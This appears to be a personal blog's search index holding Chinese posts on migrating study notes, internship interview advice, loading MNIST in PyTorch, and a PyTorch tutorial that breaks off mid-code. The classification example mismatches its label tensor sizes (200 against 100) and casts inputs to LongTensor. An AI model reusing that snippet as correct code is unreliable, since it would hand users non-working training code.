<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>及时复习！！！</title>
    <url>/2020/04/30/%E5%86%85%E5%AE%B9%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>大一时在“作业部落”上记录学习内容，今天回去翻了一下，发现好多内容都没有印象了，现逐步迁移至本站点，以作复习。内容主要为作业报告和CTF学习，内容较为零散，不建议系统学习参考使用</p>
<p>刚刚有人问我都会什么，我真的想不起来我大一学过这些，场面一度十分尴尬</p>
<p>好好反省一下自己大二这半年都在干什么</p>
<p>也希望各位可以及时复习</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/image-20200430142936841.png"  alt="image-20200430142936841" style="zoom:23%;">]]></content>
      <tags>
        <tag>notice</tag>
      </tags>
  </entry>
  <entry>
    <title>互联网公司实习面试总结</title>
    <url>/2022/02/11/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/%E5%AE%9E%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="互联网公司后端开发岗位面试经验分享"><a href="#互联网公司后端开发岗位面试经验分享" class="headerlink" title="互联网公司后端开发岗位面试经验分享"></a>互联网公司后端开发岗位面试经验分享</h1><blockquote>
<p>以下仅为<strong>个人见解</strong>，欢迎指正</p>
</blockquote>
<p>​    本文主要是想分享一下自己在找实习过程中的一些经验</p>
<p>​    挖个坑，下篇文章写简历撰写经验</p>
<h2 id="个人情况"><a href="#个人情况" class="headerlink" title="个人情况"></a>个人情况</h2><p>​    先说一下个人背景情况可以做下参考</p>
<p>​    某985程序媛，没有开发岗位实习经历</p>
<p>​    通过了字节的后端开发实习岗和华为的秋招</p>
<h2 id="经验分享"><a href="#经验分享" class="headerlink" title="经验分享"></a>经验分享</h2><h3 id="招聘信息获取渠道"><a href="#招聘信息获取渠道" class="headerlink" title="招聘信息获取渠道"></a>招聘信息获取渠道</h3><p>​    我这里都是通过各个公司的官网投递的，没有通过其他找工作的平台</p>
<h3 id="岗位选择"><a href="#岗位选择" class="headerlink" title="岗位选择"></a>岗位选择</h3><p>​    其实有很多同学都担心自己会的东西不多，过往经历不是很丰富就不敢去投递这家公司，包括我自己一开始也有这样的顾虑。后来面试了几轮之后感觉实习生（实习生必须是在校生或者是拿到其他学校offer的准研究生）来说由于对于这个领域的接触时间较短，且大多没有丰富的工作经验，所以相较于<strong>“会多少”</strong>，面试官往往更在乎的是在未来的工作需要用到某项技能时<strong>“能学会多少”</strong>。所以在面试的时候面试官往往会更加关注你的<strong>基础知识是否牢固</strong>以及你<strong>是否能够清晰表达出自己的想法</strong></p>
<p>​    前些日子看到有位同事提醒实习生的话：“<strong>我们招的是实习生，不是technical leader</strong>，所以不懂没什么大不了的，不懂就问。”我想这句话同样适用于实习面试过程——有不懂的知识是很正常的事情。</p>
<p>​    另外一个我想说的是如果经历有限且对于知识的把握程度不是特别好，建议各个公司投递的岗位尽量相同。因为在面试的准备过程中需要进行大量的知识储备，换句话来说就是背八股文（面试过程中经常被问到的基础知识）。<strong>投递工作内容相近的岗位可以帮助缩减复习范围，总结面试经验</strong></p>
<h3 id="面试流程"><a href="#面试流程" class="headerlink" title="面试流程"></a>面试流程</h3><ol>
<li><p>自我介绍</p>
</li>
<li><p>详细介绍过往项目经历的其中一个</p>
</li>
<li><p>计算机学课基础知识提问（八股文），个人简历相关知识提问</p>
</li>
<li><p>手撕代码（现场做编程题）</p>
<p> 每次面试大概一个小时左右，一个小时连续集中注意力+高强度输出，对于体力的消耗还是挺大的，做好心里准备。 </p>
</li>
</ol>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="简历"><a href="#简历" class="headerlink" title="简历"></a>简历</h4><p>​    这里特别感谢帮我改简历的t老师</p>
<p>​    一般来说在简历初筛阶段工作人员可能没有时间详细阅读你的简历，所以第一印象还是很重要的，<strong>个人认为</strong>，简历需要有三个条件——<strong>清晰、充实、有亮点</strong>。目的是可以让阅读这份简历的人可以在较短的时间内了解你的长处。关于具体的写简历经验等我有时间的时候再详细介绍吧。</p>
<h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p>​    实习生和校招生在面试时被问到的知识大多是八股文，也就是计算机学课几大基础课程中经常在面试中被问道的问题，网上有很多面经总结大家可以<strong>搜一下</strong>，个人建议，一定要<strong>背八股文</strong>，有人可能觉得背八股文比较死板，但是跟人感觉在背的过程可以帮助我回忆这几年学的基础知识，并且有一个更偏向企业应用的总体架构层面上的理解，就算在面试中没有被问道，对于像我这种本科三年学习像狗熊掰棒子一样考完就忘的人，背面经能够很好地帮我构建知识体系，还是很有帮助的</p>
<p>​    我一开始复习的时候由于科目和考研相近就去看了考研课程，我感觉自己对于计算机基础课还算是有一点点基础的，看考研课感觉有点像从零学起，看了一段时间之后觉得效率太低，内容也不太适合面试就弃了，<strong>直接看八股文面经总结</strong>效率高很多。</p>
<p>主要科目以及高频问题：</p>
<ul>
<li><strong>计算机网络（三次握手、四次挥手、tcp和udp的区别）</strong></li>
<li><strong>操作系统（进程和线程的区别；进程的通信方式；线程的通信方式）</strong></li>
<li><strong>岗位相关课程知识：C++、数据库（读锁写锁脏读幻读、mysql语句）</strong></li>
<li><strong>数据结构（没有遇到过直接问的，但是现场写代码时会涉及）</strong></li>
</ul>
<h4 id="编程能力"><a href="#编程能力" class="headerlink" title="编程能力"></a>编程能力</h4><ol>
<li><p>手撕代码</p>
<p>面试过程中一般都会让你现场写一两个题并讲解思路，时间大概在二十分钟左右，时间比较短所以代码不会太繁琐</p>
<p>建议<strong>刷剑指offer</strong>，一定要自己写一遍，不要看着觉得会了就过了。。</p>
</li>
<li><p>编程能力积累</p>
<p>如果是春招秋招需要编程笔试的建议平时刷刷题，实习一般没有笔试</p>
</li>
</ol>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol>
<li><p><strong>不要因为被问到不会的内容就害怕</strong>，就像我前面说到的那样，面试官本就不会要求一个实习生或者校招生什么都懂，反而一定会问到你的知识上限，也就是你不懂的地方，这样才能评估你的水平</p>
</li>
<li><p><strong>不要不懂装懂</strong>，ta问的东西一定是他懂的，编了也没用，随便编造可能反而会拉低印象分</p>
</li>
<li><p><strong>注重表达能力</strong>，公司非常看重团队工作，沟通很重要，认真听取他人的想法、清晰表达自己的思路都是非常重要的</p>
</li>
</ol>
<p>我当时不断地“面了挂，挂了面”，当时有兄弟跟我说“所以叫挂面”，还是挺形象的。<strong>面试挂掉是很常见的事情，尤其是前面几场</strong>，对于整体面试流程和提问重点还不熟悉的时候，并且是否录用并不取决于面试者的个人能力，可能还和”每周到岗天数“”实习期限长短“”你的特长是否是该组所缺少的“或者”性格是否适合这项工作“等等等有关，所以就算面试不成功，即时复盘总结、调整心态准备下一场才是最重要的。</p>
]]></content>
      <categories>
        <category>实习</category>
      </categories>
      <tags>
        <tag>实习</tag>
      </tags>
  </entry>
  <entry>
    <title>pytorch中引入mnist数据集</title>
    <url>/2021/04/16/python/pytorch/mnist%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>关于数据集FashionMNist，可以选择在代码中下载，也可以手动下载<a href="https://gitee.com/mirrors/Fashion-MNIST/">https://gitee.com/mirrors/Fashion-MNIST/</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mnist_train = torchvision.datasets.FashionMNIST(</span><br><span class="line">              root=<span class="string">'data/fashion/'</span>,</span><br><span class="line">              train=<span class="literal">True</span>, download=<span class="literal">True</span>, transform=torchvision.transforms.ToTensor())</span><br></pre></td></tr></table></figure>

<p>路径结构为</p>
<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/04/16/python/pytorch/mnist%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5/image-20210416154219469.png"  alt="image-20210416154219469" style="zoom:50%;">

<p>如果<code>download=True</code>，则等待下载即可。如果手动下载，注意在变量root路径下<strong>建立<code>FashionMNIST</code>文件夹</strong>（和<code>torchvision.datasets.FashioMNIST</code>中的<code>FashionMNIST</code>相同），将<strong>下载内容放入<code>raw</code>中</strong>（解压不解压均可）</p>
<p>注意，如果没有processed文件夹中的内容，依然需要设置<code>download=True</code>，<strong>建议直接设置为<code>download=True</code></strong>，代码将自动检测是否需要下载数据集</p>
<p>如果设置不好将会报错：<code>RuntimeError: Dataset not found.</code></p>
<p>当然也可以只放入processed文件夹，这时<code>download=False</code>即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_data_ = torchvision.datasets.MNIST( <span class="comment"># 在root下创建文件夹"MNIST"</span></span><br><span class="line">    root=<span class="string">'./mnist'</span>,</span><br><span class="line">    train=<span class="literal">True</span>,</span><br><span class="line">    transform=torchvision.transforms.ToTensor(),  <span class="comment"># np array(pixel)修改为tensor （0，255）-&gt;（0，1）</span></span><br><span class="line">    download=<span class="literal">False</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2021/04/16/python/pytorch/mnist%E6%96%87%E4%BB%B6%E5%BC%95%E5%85%A5/image-20210416155017835.png"  alt="image-20210416155017835" style="zoom:67%;">



]]></content>
      <categories>
        <category>pytorch</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>机器学习</tag>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title>莫烦python pytorch学习</title>
    <url>/2021/03/31/python/pytorch/morvan/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="pytorch和numpy"><a href="#pytorch和numpy" class="headerlink" title="pytorch和numpy"></a>pytorch和numpy</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># numpy和torch的转换</span></span><br><span class="line">np_data = np.arange(<span class="number">6</span>).reshape((<span class="number">2</span>, <span class="number">3</span>))<span class="comment"># 2行3列</span></span><br><span class="line">torch_data = torch.from_numpy(np_data)</span><br><span class="line">tensor2array = torch_data.numpy()</span><br><span class="line">print(</span><br><span class="line">    <span class="string">'\nnumpy array:'</span>, np_data,          <span class="comment"># [[0 1 2], [3 4 5]]</span></span><br><span class="line">    <span class="string">'\ntorch tensor:'</span>, torch_data,      <span class="comment">#  0  1  2 \n 3  4  5    [torch.LongTensor of size 2x3]</span></span><br><span class="line">    <span class="string">'\ntensor to array:'</span>, tensor2array, <span class="comment"># [[0 1 2], [3 4 5]]</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>如果是nparray，直接使用from_numpy(data)即可<br>如果是普通数组，使用torch.FloatTensor(data)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数学运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># abs 计算绝对值</span></span><br><span class="line">data=[<span class="number">-1</span>,<span class="number">-2</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">tensor=torch.FloatTensor(data)<span class="comment">#转换成32位浮点tensor</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="comment"># data=[-1,-2,1,2]</span></span><br><span class="line"><span class="comment"># tensor=torch.from_numpy(np.array(data))</span></span><br><span class="line"></span><br><span class="line">print(</span><br><span class="line">    <span class="string">'\nabs'</span>,</span><br><span class="line">    <span class="string">'\nnumpy: '</span>, np.abs(data),          <span class="comment"># [1 2 1 2]</span></span><br><span class="line">    <span class="string">'\ntorch: '</span>, torch.abs(tensor)      <span class="comment"># [1 2 1 2]</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sin   三角函数 sin</span></span><br><span class="line">print(</span><br><span class="line">    <span class="string">'\nsin'</span>,</span><br><span class="line">    <span class="string">'\nnumpy: '</span>, np.sin(data),      <span class="comment"># [-0.84147098 -0.90929743  0.84147098  0.90929743]</span></span><br><span class="line">    <span class="string">'\ntorch: '</span>, torch.sin(tensor)  <span class="comment"># [-0.8415 -0.9093  0.8415  0.9093]</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mean  均值</span></span><br><span class="line">print(</span><br><span class="line">    <span class="string">'\nmean'</span>,</span><br><span class="line">    <span class="string">'\nnumpy: '</span>, np.mean(data),         <span class="comment"># 0.0</span></span><br><span class="line">    <span class="string">'\ntorch: '</span>, torch.mean(tensor)     <span class="comment"># 0.0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># matrix multiplication 矩阵点乘</span></span><br><span class="line">data = [[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">tensor = torch.FloatTensor(data)  <span class="comment"># 转换成32位浮点 tensor</span></span><br><span class="line"><span class="comment"># correct method</span></span><br><span class="line">print(</span><br><span class="line">    <span class="string">'\nmatrix multiplication (matmul)'</span>,</span><br><span class="line">    <span class="string">'\nnumpy: '</span>, np.matmul(data, data),     <span class="comment"># [[7, 10], [15, 22]]</span></span><br><span class="line">    <span class="string">'\ntorch: '</span>, torch.mm(tensor, tensor)   <span class="comment"># [[7, 10], [15, 22]]</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># !!!!  下面是错误的方法 !!!!</span></span><br><span class="line">data = np.array(data)</span><br><span class="line">print(</span><br><span class="line">    <span class="string">'\nmatrix multiplication (dot)'</span>,</span><br><span class="line">    <span class="string">'\nnumpy: '</span>, data.dot(data),        <span class="comment"># [[7, 10], [15, 22]] 在numpy 中可行</span></span><br><span class="line">    <span class="string">'\ntorch: '</span>, tensor.dot(tensor)     <span class="comment"># torch 会转换成 [1,2,3,4].dot([1,2,3,4) = 30.0 </span></span><br><span class="line">    <span class="comment"># 该写法在我的python里直接报错了</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h1 id="variable"><a href="#variable" class="headerlink" title="variable"></a>variable</h1><blockquote>
<p>在 Torch 中的 Variable 就是一个存放会变化的值的地理位置. 里面的值会不停的变化. 就像一个裝鸡蛋的篮子, 鸡蛋数会不停变动. 那谁是里面的鸡蛋呢, 自然就是 Torch 的 Tensor 咯. 如果用一个 Variable 进行计算, 那返回的也是一个同类型的 Variable.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line"></span><br><span class="line">tensor = torch.FloatTensor([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line">variable = Variable(tensor, requires_grad=<span class="literal">True</span>)  <span class="comment"># 需要生成梯度信息</span></span><br><span class="line">print(tensor)</span><br><span class="line">print(variable)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>tensor([[1., 2.],<br>        [3., 4.]])<br>tensor([[1., 2.],<br>        [3., 4.]], requires_grad=True)</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(tensor*tensor) <span class="comment"># x^2</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>tensor([[ 1.,  4.],<br>        [ 9., 16.]])</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t_out = torch.mean(tensor*tensor)       <span class="comment"># x^2</span></span><br><span class="line">v_out = torch.mean(variable*variable)   <span class="comment"># x^2</span></span><br><span class="line">print(t_out)</span><br><span class="line">print(v_out)    <span class="comment"># 7.5</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>tensor(7.5000)<br>tensor(7.5000, grad_fn=<MeanBackward0>)</MeanBackward0></p>
</blockquote>
<blockquote>
<p> <font color="green"><strong>Variable 计算时, 它在背景幕布后面一步步默默地搭建着一个庞大的系统, 叫做计算图, computational graph. 这个图是用来将所有的计算步骤 (节点) 都连接起来, 最后进行误差反向传递的时候, 一次性将所有 variable 里面的修改幅度 (梯度) 都计算出来, 而 tensor 就没有这个能力.</strong></font></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v_out.backward()    <span class="comment"># 模拟 v_out 的误差反向传递</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面两步看不懂没关系, 只要知道 Variable 是计算图的一部分, 可以用来传递误差就好.</span></span><br><span class="line"><span class="comment"># v_out = 1/4 * sum(variable*variable) 这是计算图中的 v_out 计算步骤</span></span><br><span class="line"><span class="comment"># 针对于 v_out 的梯度就是, d(v_out)/d(variable) = 1/4*2*variable = variable/2</span></span><br><span class="line"></span><br><span class="line">print(variable.grad)    <span class="comment"># 初始 Variable 的梯度</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> 0.5000  1.0000</span></span><br><span class="line"><span class="string"> 1.5000  2.0000</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(variable)     <span class="comment">#  Variable 形式</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Variable containing:</span></span><br><span class="line"><span class="string"> 1  2</span></span><br><span class="line"><span class="string"> 3  4</span></span><br><span class="line"><span class="string">[torch.FloatTensor of size 2x2]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(variable.data)    <span class="comment"># tensor 形式</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"> 1  2</span></span><br><span class="line"><span class="string"> 3  4</span></span><br><span class="line"><span class="string">[torch.FloatTensor of size 2x2]</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">print(variable.data.numpy())    <span class="comment"># numpy 形式</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[[ 1.  2.]</span></span><br><span class="line"><span class="string"> [ 3.  4.]]</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h1 id="激励函数"><a href="#激励函数" class="headerlink" title="激励函数"></a>激励函数</h1><p>梯度爆炸和梯度消失</p>
<p>CNN-&gt; relu</p>
<p>rnn-&gt; relu or tanh</p>
<p>非线性函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F  <span class="comment"># 激励函数都在这</span></span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x = torch.linspace(<span class="number">-5</span>, <span class="number">5</span>, <span class="number">200</span>)  <span class="comment"># [-5,5] 200个均分</span></span><br><span class="line">x = Variable(x)</span><br><span class="line"></span><br><span class="line">x_np = x.data.numpy()  <span class="comment"># 画图</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 激励函数</span></span><br><span class="line"></span><br><span class="line">y_relu = F.relu(x).data.numpy()</span><br><span class="line">y_sigmoid = F.sigmoid(x).data.numpy()</span><br><span class="line">y_tanh = F.tanh(x).data.numpy()</span><br><span class="line">y_softplus = F.softplus(x).data.numpy()</span><br><span class="line"></span><br><span class="line">plt.figure(<span class="number">1</span>, figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">plt.subplot(<span class="number">221</span>)</span><br><span class="line">plt.plot(x_np, y_relu, c=<span class="string">'red'</span>, label=<span class="string">'relu'</span>)</span><br><span class="line">plt.ylim((<span class="number">-1</span>, <span class="number">5</span>))</span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">222</span>)</span><br><span class="line">plt.plot(x_np, y_sigmoid, c=<span class="string">'red'</span>, label=<span class="string">'sigmoid'</span>)</span><br><span class="line">plt.ylim((<span class="number">-0.2</span>, <span class="number">1.2</span>))</span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">223</span>)</span><br><span class="line">plt.plot(x_np, y_tanh, c=<span class="string">'red'</span>, label=<span class="string">'tanh'</span>)</span><br><span class="line">plt.ylim((<span class="number">-1.2</span>, <span class="number">1.2</span>))</span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">224</span>)</span><br><span class="line">plt.plot(x_np, y_softplus, c=<span class="string">'red'</span>, label=<span class="string">'softplus'</span>)</span><br><span class="line">plt.ylim((<span class="number">-0.2</span>, <span class="number">6</span>))</span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>



<img src="/img/loading.gif" class="lazyload" data-src="/images/morvanpytorch/image-20210327185811769.png"  alt="image-20210327185811769" style="zoom: 80%;">

<h1 id="关系拟合"><a href="#关系拟合" class="headerlink" title="关系拟合"></a>关系拟合</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F  <span class="comment"># 激励函数都在这</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把一维数据编程二维</span></span><br><span class="line">x = torch.unsqueeze(torch.linspace(<span class="number">-1</span>, <span class="number">1</span>, <span class="number">100</span>), dim=<span class="number">1</span>)  <span class="comment"># x data (tensor), shape=(100, 1)</span></span><br><span class="line"><span class="comment"># 增加噪点</span></span><br><span class="line">y = x.pow(<span class="number">2</span>) + <span class="number">0.2</span> * torch.rand(x.size())  <span class="comment"># noisy y data (tensor), shape=(100, 1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(torch.nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n_features, n_hidden, n_output)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        <span class="comment"># 输入个数和隐藏层神经元个数</span></span><br><span class="line">        self.hidden = torch.nn.Linear(n_features, n_hidden)  <span class="comment"># 隐藏层</span></span><br><span class="line">        self.predict = torch.nn.Linear(n_hidden, n_output)  <span class="comment"># 输出层，如果只输出y，则output=1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x = F.relu(self.hidden(x))  <span class="comment"># 对隐藏层使用激励函数</span></span><br><span class="line">        x = self.predict(x)  <span class="comment"># 输出值</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net = Net(n_features=<span class="number">1</span>, n_hidden=<span class="number">10</span>, n_output=<span class="number">1</span>)</span><br><span class="line">print(net)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SGD优化器</span></span><br><span class="line">optimizer = torch.optim.SGD(net.parameters(), lr=<span class="number">0.2</span>)</span><br><span class="line">loss_func = torch.nn.MSELoss()  <span class="comment"># 均方差，用于回归问题</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">100</span>):  <span class="comment"># 100步训练</span></span><br><span class="line">    prediction = net(x) <span class="comment"># 输出预测值</span></span><br><span class="line"></span><br><span class="line">    loss = loss_func(prediction, y)  <span class="comment"># 计算误差和真实的差</span></span><br><span class="line"></span><br><span class="line">    optimizer.zero_grad()  <span class="comment"># 将所有参数的梯度降为0</span></span><br><span class="line">    loss.backward()  <span class="comment"># 反向传递，计算参数更新值</span></span><br><span class="line">    optimizer.step()  <span class="comment"># 以lr优化</span></span><br><span class="line">	<span class="comment"># 可以用于画图查看神经网络调整流程</span></span><br></pre></td></tr></table></figure>

<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F  <span class="comment"># 激励函数都在这</span></span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假数据</span></span><br><span class="line"><span class="comment"># 100行2列 1</span></span><br><span class="line">n_data = torch.ones(<span class="number">100</span>, <span class="number">2</span>)  <span class="comment"># 数据的基本形态</span></span><br><span class="line"><span class="comment"># 正态分布(means每个输出元素的均值,std标准差,out=None可选的输出张量)</span></span><br><span class="line">x0 = torch.normal(<span class="number">2</span> * n_data, <span class="number">1</span>)  <span class="comment"># 类型0 x data (tensor), shape=(100, 2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维行向量</span></span><br><span class="line">y0 = torch.zeros(<span class="number">200</span>)  <span class="comment"># 类型0 y data (tensor), shape=(100, )</span></span><br><span class="line">x1 = torch.normal(<span class="number">-2</span> * n_data, <span class="number">1</span>)  <span class="comment"># 类型1 x data (tensor), shape=(100, 1)</span></span><br><span class="line">y1 = torch.ones(<span class="number">200</span>)  <span class="comment"># 类型1 y data (tensor), shape=(100, )</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意 x, y 数据的数据形式是一定要像下面一样 (torch.cat 是在合并数据)</span></span><br><span class="line"><span class="comment"># 有0，按行合并，没有按列</span></span><br><span class="line">x = torch.cat((x0, x1), <span class="number">0</span>).type(torch.LongTensor)  <span class="comment"># FloatTensor = 32-bit floating</span></span><br><span class="line">y = torch.cat((y0, y1), ).type(torch.LongTensor)  <span class="comment"># LongTensor = 64-bit integer</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># y=0,y=1两个颜色</span></span><br><span class="line">plt.scatter(x.data.numpy()[:, <span class="number">0</span>], x.data.numpy()[:, <span class="number">1</span>], c=y.data.numpy(), s=<span class="number">100</span>, lw=<span class="number">0</span>, cmap=<span class="string">'RdYlGn'</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(torch.nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n_features, n_hidden, n_output)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        <span class="comment"># 输入个数和隐藏层神经元个数</span></span><br><span class="line">        self.hidden = torch.nn.Linear(n_features, n_hidden)  <span class="comment"># 隐藏层</span></span><br><span class="line">        self.predict = torch.nn.Linear(n_hidden, n_output)  <span class="comment"># 输出层，如果只输出y，则output=1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x = F.relu(self.hidden(x))  <span class="comment"># 对隐藏层使用激励函数</span></span><br><span class="line">        x = self.predict(x)  <span class="comment"># 输出值</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(torch.nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n_features, n_hidden, n_output)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        <span class="comment"># 输入个数和隐藏层神经元个数</span></span><br><span class="line">        self.hidden = torch.nn.Linear(n_features, n_hidden)  <span class="comment"># 隐藏层</span></span><br><span class="line">        self.predict = torch.nn.Linear(n_hidden, n_output)  <span class="comment"># 输出层，如果只输出y，则output=1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x = F.relu(self.hidden(x))  <span class="comment"># 对隐藏层使用激励函数</span></span><br><span class="line">        x = self.predict(x)  <span class="comment"># 输出值</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net = Net(n_features=<span class="number">2</span>, n_hidden=<span class="number">10</span>, n_output=<span class="number">2</span>)  <span class="comment"># 分成2类，output=2</span></span><br><span class="line"><span class="comment"># 如果输出是[0,1]则分类为1</span></span><br><span class="line"><span class="comment"># 如果输出为[1,0]则分类为0</span></span><br><span class="line">print(net)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SGD优化器</span></span><br><span class="line">optimizer = torch.optim.SGD(net.parameters(), lr=<span class="number">0.05</span>)</span><br><span class="line">loss_func = torch.nn.CrossEntropyLoss()  <span class="comment"># 用于分类问题，softmax</span></span><br><span class="line"><span class="comment"># 例 输出[0.1,0.2,0.7] 